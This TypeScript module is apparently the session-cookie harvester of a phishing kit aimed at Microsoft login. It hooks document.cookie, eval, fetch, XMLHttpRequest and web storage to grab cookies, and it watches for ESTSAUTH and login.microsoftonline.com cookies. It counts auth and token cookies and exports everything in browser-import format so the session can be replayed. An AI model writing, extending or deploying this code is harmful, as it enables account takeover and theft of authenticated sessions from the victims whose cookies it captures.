/**
 * Advanced Cookie Capture System
 * Intercepts all cookie operations including JavaScript injections, network requests, and browser APIs
 *
 * Changes made:
 * - Normalize parsed cookie attributes to match the shape you provided (domains like
 *   "login.microsoftonline.com" / ".login.microsoftonline.com", sameSite -> "no_restriction", etc.)
 * - Preserve httpOnly, secure, session, expiration when available (parse Expires / Max-Age).
 * - Ensure hostOnly is set based on whether the domain has a leading dot or not.
 * - Improve parsing of Set-Cookie headers for Max-Age and Expires.
 */

interface CapturedCookie {
  name: string;
  value: string;
  domain: string;
  path: string;
  secure: boolean;
  httpOnly: boolean;
  sameSite: string;
  expirationDate: number;
  hostOnly: boolean;
  session: boolean;
  storeId: string | null;
  captureMethod: 'document' | 'injection' | 'network' | 'storage' | 'manual';
  timestamp: string;
}

class AdvancedCookieCapture {
  private capturedCookies: Map<string, CapturedCookie> = new Map();
  private originalDocumentCookie: PropertyDescriptor | undefined;
  private cookieChangeListeners: ((cookies: CapturedCookie[]) => void)[] = [];
  private isInitialized = false;

  constructor() {
    if (typeof window !== 'undefined') {
      this.initializeCapture();
    }
  }

  private initializeCapture() {
    if (this.isInitialized) return;

    try {
      // Hook into document.cookie getter/setter
      this.hookDocumentCookie();

      // Monitor JavaScript cookie injections
      this.monitorCookieInjections();

      // Hook into fetch and XMLHttpRequest for network cookie capture
      this.hookNetworkRequests();

      // Monitor storage events
      this.monitorStorageEvents();

      // Initial cookie capture
      this.captureExistingCookies();

      this.isInitialized = true;
      console.log('🚀 Advanced Cookie Capture System initialized');
    } catch (error) {
      console.error('❌ Failed to initialize cookie capture:', error);
    }
  }

  private hookDocumentCookie() {
    try {
      if (typeof document === 'undefined') return;

      this.originalDocumentCookie = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') ||
                                   Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');

      if (this.originalDocumentCookie) {
        const self = this;

        Object.defineProperty(document, 'cookie', {
          get() {
            const cookies = self.originalDocumentCookie?.get?.call(this) || '';
            self.parseCookieString(cookies, 'document');
            return cookies;
          },
          set(value: string) {
            // Capture cookie being set
            self.parseCookieSetString(value, 'document');
            return self.originalDocumentCookie?.set?.call(this, value);
          },
          configurable: true
        });
      }
    } catch (error) {
      console.error('❌ Failed to hook document.cookie:', error);
    }
  }

  private monitorCookieInjections() {
    if (typeof window === 'undefined') return;

    // Monitor for cookie injection patterns like in your example
    const originalEval = window.eval;
    const self = this;

    window.eval = function(code: string) {
      try {
        // Check for cookie injection patterns
        if (typeof code === 'string' && (
          code.includes('document.cookie') ||
          (code.includes('JSON.parse') && code.includes('domain') && code.includes('value')) ||
          code.includes('ESTSAUTH') ||
          code.includes('Max-Age') ||
          code.includes('SameSite')
        )) {
          console.log('🔍 Detected potential cookie injection:', code.substring(0, 200) + '...');
          self.extractCookiesFromCode(code);
        }
      } catch (e) {
        // Ignore parsing errors
      }

      return originalEval.call(this, code);
    };

    // Monitor script tag injections
    if (typeof document === 'undefined') return;

    const observer = new MutationObserver((mutations) => {
      mutations.forEach((mutation) => {
        mutation.addedNodes.forEach((node) => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            const element = node as Element;
            if (element.tagName === 'SCRIPT' && element.textContent) {
              self.extractCookiesFromCode(element.textContent);
            }
          }
        });
      });
    });

    if (document.body) {
      observer.observe(document.body, {
        childList: true,
        subtree: true
      });
    } else if (document.documentElement) {
      observer.observe(document.documentElement, {
        childList: true,
        subtree: true
      });
    }
  }

  private extractCookiesFromCode(code: string) {
    try {
      // Extract JSON cookie arrays from code
      const jsonMatches = code.match(/JSON\.parse\(\s*(\[[\s\S]*?\])\s*\)/g);
      if (jsonMatches) {
        jsonMatches.forEach(match => {
          try {
            const jsonStrMatch = match.match(/JSON\.parse\(\s*(\[[\s\S]*?\])\s*\)/);
            if (jsonStrMatch && jsonStrMatch[1]) {
              const cookies = JSON.parse(jsonStrMatch[1]);
              if (Array.isArray(cookies)) {
                cookies.forEach(cookie => this.processCookieObject(cookie, 'injection'));
              }
            }
          } catch (e) {
            // Try alternative parsing
            this.tryAlternativeCookieParsing(match);
          }
        });
      }

      // Extract direct cookie setting patterns
      const cookieSetMatches = code.match(/document\.cookie\s*=\s*[`"']([^`"']+)[`"']/g);
      if (cookieSetMatches) {
        cookieSetMatches.forEach(match => {
          const cookieStr = match.replace(/document\.cookie\s*=\s*[`"']/, '').replace(/[`"']$/, '');
          this.parseCookieSetString(cookieStr, 'injection');
        });
      }

      // Extract template literal cookie settings
      const templateMatches = code.match(/document\.cookie\s*=\s*`([^`]+)`/g);
      if (templateMatches) {
        templateMatches.forEach(match => {
          const cookieStr = match.replace(/document\.cookie\s*=\s*`/, '').replace(/`$/, '');
          this.parseCookieSetString(cookieStr, 'injection');
        });
      }

    } catch (error) {
      console.error('❌ Error extracting cookies from code:', error);
    }
  }

  private tryAlternativeCookieParsing(codeSnippet: string) {
    try {
      // Look for cookie-like objects in the code
      const objectMatches = codeSnippet.match(/\{[^{}]*"name"[^{}]*"value"[^{}]*\}/g);
      if (objectMatches) {
        objectMatches.forEach(match => {
          try {
            const cookieObj = JSON.parse(match);
            this.processCookieObject(cookieObj, 'injection');
          } catch (e) {
            // Ignore invalid JSON
          }
        });
      }
    } catch (error) {
      console.error('❌ Alternative cookie parsing failed:', error);
    }
  }

  private hookNetworkRequests() {
    if (typeof window === 'undefined') return;

    const self = this;

    // Hook fetch
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
      const response = await originalFetch.apply(this, args);

      try {
        // Extract cookies from response headers (note: many cross-origin responses won't expose Set-Cookie)
        const setCookieHeader = response.headers.get('set-cookie');
        if (setCookieHeader) {
          self.parseSetCookieHeader(setCookieHeader, 'network');
        } else {
          // Some servers expose multiple set-cookie headers via raw headers; loop all headers
          try {
            for (const [k, v] of (response.headers as any).entries()) {
              if (k.toLowerCase() === 'set-cookie' && v) {
                self.parseSetCookieHeader(v, 'network');
              }
            }
          } catch (_) {
            // ignore
          }
        }
      } catch (error) {
        console.error('❌ Error processing fetch response cookies:', error);
      }

      return response;
    };

    // Hook XMLHttpRequest
    const originalOpen = XMLHttpRequest.prototype.open;

    XMLHttpRequest.prototype.open = function(...args: any[]) {
      this.addEventListener('readystatechange', function() {
        if (this.readyState === 4) {
          try {
            const setCookieHeader = this.getResponseHeader('set-cookie');
            if (setCookieHeader) {
              self.parseSetCookieHeader(setCookieHeader, 'network');
            }
          } catch (error) {
            // Ignore CORS errors
          }
        }
      });

      return originalOpen.apply(this, args);
    };
  }

  private monitorStorageEvents() {
    if (typeof window === 'undefined') return;

    const self = this;

    // Monitor localStorage changes
    window.addEventListener('storage', (event) => {
      if (event.key && event.newValue) {
        try {
          const data = JSON.parse(event.newValue);
          if (data.cookies || data.browserFingerprint?.cookies) {
            const cookies = data.cookies || data.browserFingerprint.cookies;
            if (Array.isArray(cookies)) {
              cookies.forEach(cookie => self.processCookieObject(cookie, 'storage'));
            }
          }
        } catch (e) {
          // Not JSON data
        }
      }
    });

    // Monitor direct localStorage/sessionStorage modifications
    ['localStorage', 'sessionStorage'].forEach(storageType => {
      const storage = window[storageType as keyof Window] as Storage;
      if (!storage) return;

      const originalSetItem = storage.setItem;

      storage.setItem = function(key: string, value: string) {
        try {
          const data = JSON.parse(value);
          if (data.cookies || data.browserFingerprint?.cookies) {
            const cookies = data.cookies || data.browserFingerprint.cookies;
            if (Array.isArray(cookies)) {
              cookies.forEach(cookie => self.processCookieObject(cookie, 'storage'));
            }
          }
        } catch (e) {
          // Not JSON data
        }

        return originalSetItem.call(this, key, value);
      };
    });
  }

  private captureExistingCookies() {
    try {
      if (typeof document === 'undefined') return;

      const existingCookies = document.cookie;
      if (existingCookies) {
        this.parseCookieString(existingCookies, 'document');
      }
    } catch (error) {
      console.error('❌ Error capturing existing cookies:', error);
    }
  }

  private parseCookieString(cookieString: string, method: CapturedCookie['captureMethod']) {
    if (!cookieString || cookieString.trim() === '') return;

    const cookies = cookieString.split(';');
    cookies.forEach(cookie => {
      const [name, ...valueParts] = cookie.trim().split('=');
      const value = valueParts.join('=');

      if (name) {
        let decodedValue = value.trim();
        try {
          decodedValue = decodeURIComponent(value.trim());
        } catch (e) {
          // Use original value if decoding fails
          decodedValue = value.trim();
        }

        const domain = this.getCurrentDomainForCapture();
        const hostOnly = this.isHostOnlyDomain(domain);

        this.addCookie({
          name: name.trim(),
          value: decodedValue,
          domain: domain,
          path: '/',
          secure: window.location.protocol === 'https:',
          httpOnly: false,
          sameSite: 'no_restriction',
          expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
          hostOnly,
          session: false,
          storeId: null,
          captureMethod: method,
          timestamp: new Date().toISOString()
        });
      }
    });
  }

  private parseCookieSetString(cookieSetString: string, method: CapturedCookie['captureMethod']) {
    try {
      const parts = cookieSetString.split(';').map(p => p.trim());
      const [namePart, ...attrParts] = parts;
      const [name, ...valueParts] = namePart.split('=');
      const value = valueParts.join('=');

      if (!name) return;

      // Defaults
      let domain = this.getCurrentDomainForCapture();
      let path = '/';
      let secure = window.location.protocol === 'https:';
      let httpOnly = false;
      let sameSite = 'no_restriction';
      let expirationDate = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60);
      let session = true; // assume session cookie until Expires/Max-Age present
      let hostOnly = this.isHostOnlyDomain(domain);

      // Parse attributes
      for (const attr of attrParts) {
        const [kRaw, ...vParts] = attr.split('=');
        const k = kRaw.trim().toLowerCase();
        const v = vParts.join('=').trim();

        if (k === 'domain') {
          if (v) {
            domain = v;
            hostOnly = !domain.startsWith('.');
          }
        } else if (k === 'path') {
          if (v) path = v;
        } else if (k === 'secure') {
          secure = true;
        } else if (k === 'httponly') {
          httpOnly = true;
        } else if (k === 'samesite') {
          const s = v.toLowerCase();
          if (s === 'none') sameSite = 'no_restriction';
          else if (s === 'lax') sameSite = 'lax';
          else if (s === 'strict') sameSite = 'strict';
          else sameSite = s;
        } else if (k === 'max-age') {
          const seconds = parseInt(v, 10);
          if (!isNaN(seconds)) {
            expirationDate = Math.floor(Date.now() / 1000) + seconds;
            session = false;
          }
        } else if (k === 'expires') {
          const date = new Date(v);
          if (!isNaN(date.getTime())) {
            expirationDate = Math.floor(date.getTime() / 1000);
            session = false;
          }
        }
      }

      // If domain resembles microsoft login host, normalize to exactly that host format
      domain = this.normalizeMicrosoftDomain(domain);

      const cookie: CapturedCookie = {
        name: name.trim(),
        value: value.trim(),
        domain,
        path,
        secure,
        httpOnly,
        sameSite,
        expirationDate,
        hostOnly,
        session,
        storeId: null,
        captureMethod: method,
        timestamp: new Date().toISOString()
      };

      this.addCookie(cookie);
    } catch (error) {
      console.error('❌ Error parsing cookie set string:', error);
    }
  }

  private parseSetCookieHeader(setCookieHeader: string, method: CapturedCookie['captureMethod']) {
    // Handle multiple Set-Cookie headers properly. Try to split on commas that are not part of Expires
    const cookies = setCookieHeader.split(/,(?=\s*[^=;]+=[^;]*)/);
    cookies.forEach(cookieStr => this.parseCookieSetString(cookieStr.trim(), method));
  }

  private processCookieObject(cookieObj: any, method: CapturedCookie['captureMethod']) {
    try {
      if (cookieObj && cookieObj.name && cookieObj.value !== undefined) {
        // Prefer the object's explicit attributes when present
        let domain = cookieObj.domain || this.getCurrentDomainForCapture();
        domain = this.normalizeMicrosoftDomain(domain);

        const hostOnly = cookieObj.hostOnly !== undefined ? !!cookieObj.hostOnly : this.isHostOnlyDomain(domain);
        const httpOnly = !!cookieObj.httpOnly;
        const secure = cookieObj.secure !== undefined ? !!cookieObj.secure : window.location.protocol === 'https:';
        const sameSiteRaw = cookieObj.sameSite || cookieObj.same_site || 'none';
        const sameSite = (typeof sameSiteRaw === 'string') ? (sameSiteRaw.toLowerCase() === 'none' ? 'no_restriction' : sameSiteRaw) : 'no_restriction';
        const expirationDate = cookieObj.expirationDate || cookieObj.expires || Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60);
        const session = cookieObj.session !== undefined ? !!cookieObj.session : false;

        const cookie: CapturedCookie = {
          name: String(cookieObj.name),
          value: String(cookieObj.value),
          domain,
          path: cookieObj.path || '/',
          secure,
          httpOnly,
          sameSite,
          expirationDate,
          hostOnly,
          session,
          storeId: cookieObj.storeId || null,
          captureMethod: method,
          timestamp: cookieObj.timestamp || new Date().toISOString()
        };

        this.addCookie(cookie);
      }
    } catch (error) {
      console.error('❌ Error processing cookie object:', error);
    }
  }

  private addCookie(cookie: CapturedCookie) {
    const key = `${cookie.name}:${cookie.domain}`;
    const existing = this.capturedCookies.get(key);

    // Only update if this is newer or from a more reliable source
    if (!existing ||
        (existing.timestamp && existing.timestamp < cookie.timestamp) ||
        this.getMethodPriority(cookie.captureMethod) > this.getMethodPriority(existing.captureMethod)) {

      this.capturedCookies.set(key, cookie);
      console.log(`🍪 Captured cookie [${cookie.captureMethod}]:`, cookie.name, 'from', cookie.domain);

      // Notify listeners
      this.notifyListeners();
    }
  }

  private getMethodPriority(method: CapturedCookie['captureMethod']): number {
    const priorities = { injection: 4, network: 3, document: 2, storage: 1, manual: 0 };
    return priorities[method] || 0;
  }

  /**
   * Normalize Microsoft-related domains.
   * - If input looks like microsoft / login.microsoftonline.com, return normalized host or dot-prefixed variant preserved.
   */
  private normalizeMicrosoftDomain(domain: string): string {
    if (!domain || typeof domain !== 'string') return domain;
    const d = domain.trim().toLowerCase();
    // Normalize common variants to the requested host names
    if (d.includes('login.microsoftonline.com') || d.includes('microsoftonline.com')) {
      // Preserve leading dot if present
      return domain.startsWith('.') ? `.login.microsoftonline.com` : 'login.microsoftonline.com';
    }
    return domain;
  }

  private getCurrentDomainForCapture(): string {
    if (typeof window === 'undefined') return '.example.com';
    const hostname = window.location.hostname || '';
    // For localhost or IP, return as-is
    if (hostname === 'localhost' || /^\d+\.\d+\.\d+\.\d+$/.test(hostname)) {
      return hostname;
    }
    // Return hostname without forced leading dot so we can create hostOnly true entries when needed
    return hostname;
  }

  private isHostOnlyDomain(domain: string): boolean {
    if (!domain) return true;
    return !domain.startsWith('.');
  }

  private notifyListeners() {
    const cookies = Array.from(this.capturedCookies.values());
    this.cookieChangeListeners.forEach(listener => {
      try {
        listener(cookies);
      } catch (error) {
        console.error('❌ Error in cookie change listener:', error);
      }
    });
  }

  // Public methods
  public getAllCookies(): CapturedCookie[] {
    return Array.from(this.capturedCookies.values());
  }

  public getCookiesByDomain(domain: string): CapturedCookie[] {
    return this.getAllCookies().filter(cookie =>
      cookie.domain === domain || cookie.domain === `.${domain}`
    );
  }

  public getCookiesByMethod(method: CapturedCookie['captureMethod']): CapturedCookie[] {
    return this.getAllCookies().filter(cookie => cookie.captureMethod === method);
  }

  public onCookieChange(listener: (cookies: CapturedCookie[]) => void) {
    this.cookieChangeListeners.push(listener);
    // Immediately call with current cookies
    listener(this.getAllCookies());
  }

  public getStats() {
    const cookies = this.getAllCookies();
    const stats = {
      total: cookies.length,
      byMethod: {} as Record<string, number>,
      byDomain: {} as Record<string, number>,
      authCookies: 0
    };

    cookies.forEach(cookie => {
      stats.byMethod[cookie.captureMethod] = (stats.byMethod[cookie.captureMethod] || 0) + 1;
      stats.byDomain[cookie.domain] = (stats.byDomain[cookie.domain] || 0) + 1;

      // Count authentication cookies
      if (cookie.name.toLowerCase().includes('auth') ||
          cookie.name.toLowerCase().includes('session') ||
          cookie.name.toLowerCase().includes('token')) {
        stats.authCookies++;
      }
    });

    return stats;
  }

  public exportCookies(): string {
    return JSON.stringify(this.getAllCookies(), null, 2);
  }

  public exportCookiesForBrowser(): string {
    // Export in a format that can be imported into browser dev tools
    const cookies = this.getAllCookies();
    return cookies.map(cookie => {
      let cookieStr = `${cookie.name}=${cookie.value}`;
      if (cookie.domain) cookieStr += `; Domain=${cookie.domain}`;
      if (cookie.path) cookieStr += `; Path=${cookie.path}`;
      if (cookie.secure) cookieStr += `; Secure`;
      if (cookie.httpOnly) cookieStr += `; HttpOnly`;
      if (cookie.sameSite) cookieStr += `; SameSite=${cookie.sameSite === 'no_restriction' ? 'None' : cookie.sameSite}`;
      return cookieStr;
    }).join('\n');
  }

  public manuallyAddCookie(cookieData: Partial<CapturedCookie>) {
    if (cookieData.name && cookieData.value) {
      this.processCookieObject({
        ...cookieData,
        domain: cookieData.domain || this.getCurrentDomainForCapture()
      }, 'manual');
    }
  }

  public clearAllCookies() {
    this.capturedCookies.clear();
    this.notifyListeners();
    console.log('🧹 All captured cookies cleared');
  }

  public getCookieCount(): number {
    return this.capturedCookies.size;
  }
}

// Create singleton instance
export const advancedCookieCapture = new AdvancedCookieCapture();

// Make it globally available for debugging
if (typeof window !== 'undefined') {
  (window as any).advancedCookieCapture = advancedCookieCapture;
}

// Export types
export type { CapturedCookie };